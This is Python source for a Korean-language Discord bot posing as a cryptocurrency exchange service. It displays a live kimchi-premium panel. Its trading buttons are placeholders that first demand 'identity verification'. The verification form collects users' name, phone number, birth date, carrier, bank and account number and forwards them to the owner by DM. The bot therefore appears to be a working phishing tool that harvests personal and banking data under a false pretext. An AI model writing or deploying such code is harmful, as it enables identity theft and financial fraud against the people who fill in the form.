import os
import discord
import requests
from datetime import datetime, timedelta
from discord.ext import commands, tasks
from discord.ui import View, Modal, TextInput

TOKEN = os.getenv("DISCORD_TOKEN")

VERIFY_CHANNEL_ID = 1476976182523068478
OWNER_ID = 1472930278874939445
PANEL_CHANNEL_ID = 1476976182523068478

BANNER_URL = "https://cdn.discordapp.com/attachments/1476942061747044463/1477299593598468309/REZE_COIN_OTC.gif?ex=69a441f6&is=69a2f076&hm=ffa3babff8587f9ebae5a7241dae6f83f25257b4cbb4588908859c01249bd678&"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

panel_message = None
previous_premium = None
verified_users = set()


# =======================
# 김프 시스템
# =======================

def get_exchange_rate():
    return float(requests.get("https://open.er-api.com/v6/latest/USD").json()["rates"]["KRW"])


def get_upbit_usdt_price():
    return float(requests.get("https://api.upbit.com/v1/ticker?markets=KRW-USDT").json()[0]["trade_price"])


def calculate_kimchi_premium():
    rate = get_exchange_rate()
    price = get_upbit_usdt_price()
    premium = ((price / rate) - 1) * 100
    return round(premium, 2), round(rate, 2)


def get_arrow(current, previous):
    if previous is None:
        return "➖"
    if current > previous:
        return "▲"
    if current < previous:
        return "▼"
    return "➖"


def get_kst():
    return (datetime.utcnow() + timedelta(hours=9)).strftime("%Y-%m-%d %H:%M:%S")


def create_embed(premium, rate, arrow):
    embed = discord.Embed(
        title="🪙 레제 코인대행",
        description="신속한 코인대행",
        color=0x5865F2
    )

    embed.add_field(name="💰 재고", value="0원", inline=False)
    embed.add_field(name="📊 김프 (USDT 기준)", value=f"{premium}% {arrow}", inline=False)
    embed.add_field(name="💵 환율", value=f"{rate}원", inline=False)
    embed.add_field(name="🕒 마지막 갱신", value=get_kst(), inline=False)

    embed.set_image(url=BANNER_URL)
    return embed


# =======================
# 인증 시스템
# =======================

class ApproveView(View):
    def __init__(self, user):
        super().__init__(timeout=None)
        self.user = user

    @discord.ui.button(label="승인", style=discord.ButtonStyle.success)
    async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
        verified_users.add(self.user.id)
        await self.user.send("✅ 인증 승인이 완료되었습니다.")
        await interaction.response.send_message("승인 처리 완료", ephemeral=True)

    @discord.ui.button(label="거부", style=discord.ButtonStyle.danger)
    async def reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.user.send("❌ 인증이 거부되었습니다.")
        await interaction.response.send_message("거부 처리 완료", ephemeral=True)


class VerifyModal(Modal, title="본인 인증 정보 입력"):
    def __init__(self, carrier):
        super().__init__()
        self.carrier = carrier

        self.name = TextInput(label="이름")
        self.phone = TextInput(label="전화번호")
        self.birth = TextInput(label="생년월일 6자리")
        self.bank = TextInput(label="은행명")
        self.account = TextInput(label="계좌번호")

        self.add_item(self.name)
        self.add_item(self.phone)
        self.add_item(self.birth)
        self.add_item(self.bank)
        self.add_item(self.account)

    async def on_submit(self, interaction: discord.Interaction):

        verify_channel = bot.get_channel(VERIFY_CHANNEL_ID)
        owner = await bot.fetch_user(OWNER_ID)

        embed = discord.Embed(title="📥 신규 인증 요청", color=0x5865F2)
        embed.add_field(name="👤 유저", value=interaction.user.mention, inline=False)
        embed.add_field(name="📱 통신사", value=self.carrier, inline=False)
        embed.add_field(name="이름", value=self.name.value, inline=False)
        embed.add_field(name="전화번호", value=self.phone.value, inline=False)
        embed.add_field(name="생년월일", value=self.birth.value, inline=False)
        embed.add_field(name="은행", value=self.bank.value, inline=False)
        embed.add_field(name="계좌번호", value=self.account.value, inline=False)

        if verify_channel:
            await verify_channel.send(embed=embed, view=ApproveView(interaction.user))

        try:
            await owner.send(embed=embed)
        except:
            pass

        await interaction.response.send_message("인증 요청이 접수되었습니다.", ephemeral=True)


# =======================
# 통신사 선택
# =======================

class MVNOCarrierView(View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label="알뜰폰 LGU+", style=discord.ButtonStyle.secondary)
    async def lgu(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("알뜰폰 LGU+"))

    @discord.ui.button(label="알뜰폰 KT", style=discord.ButtonStyle.secondary)
    async def kt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("알뜰폰 KT"))

    @discord.ui.button(label="알뜰폰 SKT", style=discord.ButtonStyle.secondary)
    async def skt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("알뜰폰 SKT"))


class CarrierView(View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label="LGU+", style=discord.ButtonStyle.secondary)
    async def lgu(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("LGU+"))

    @discord.ui.button(label="KT", style=discord.ButtonStyle.secondary)
    async def kt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("KT"))

    @discord.ui.button(label="SKT", style=discord.ButtonStyle.secondary)
    async def skt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("SKT"))

    @discord.ui.button(label="알뜰폰", style=discord.ButtonStyle.primary)
    async def mvno(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "알뜰폰 통신사를 선택해주세요.",
            view=MVNOCarrierView(),
            ephemeral=True
        )


# =======================
# 메인 패널
# =======================

class PanelView(View):
    def __init__(self):
        super().__init__(timeout=None)

    async def require_verify(self, interaction):
        await interaction.response.send_message(
            "본인 인증 후 이용 가능합니다.",
            view=CarrierView(),
            ephemeral=True
        )

    @discord.ui.button(label="송금", style=discord.ButtonStyle.primary, emoji="✈️")
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in verified_users:
            await self.require_verify(interaction)
            return
        await interaction.response.send_message("송금 기능입니다.", ephemeral=True)

    @discord.ui.button(label="충전", style=discord.ButtonStyle.success, emoji="💳")
    async def charge_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in verified_users:
            await self.require_verify(interaction)
            return
        await interaction.response.send_message("충전 기능입니다.", ephemeral=True)

    @discord.ui.button(label="정보", style=discord.ButtonStyle.secondary, emoji="📊")
    async def info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in verified_users:
            await self.require_verify(interaction)
            return
        await interaction.response.send_message("정보 기능입니다.", ephemeral=True)

    @discord.ui.button(label="계산", style=discord.ButtonStyle.secondary, emoji="🧮")
    async def calc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in verified_users:
            await self.require_verify(interaction)
            return
        await interaction.response.send_message("계산 기능입니다.", ephemeral=True)


# =======================
# 30초 갱신
# =======================

@tasks.loop(seconds=30)
async def update_panel():
    global panel_message, previous_premium

    premium, rate = calculate_kimchi_premium()
    arrow = get_arrow(premium, previous_premium)
    previous_premium = premium

    if panel_message:
        await panel_message.edit(embed=create_embed(premium, rate, arrow), view=PanelView())


@bot.event
async def on_ready():
    global panel_message, previous_premium

    print(f"{bot.user} 로그인 완료")

    channel = await bot.fetch_channel(PANEL_CHANNEL_ID)

    premium, rate = calculate_kimchi_premium()
    previous_premium = premium

    panel_message = await channel.send(
        embed=create_embed(premium, rate, "➖"),
        view=PanelView()
    )

    update_panel.start()


bot.run(TOKEN)
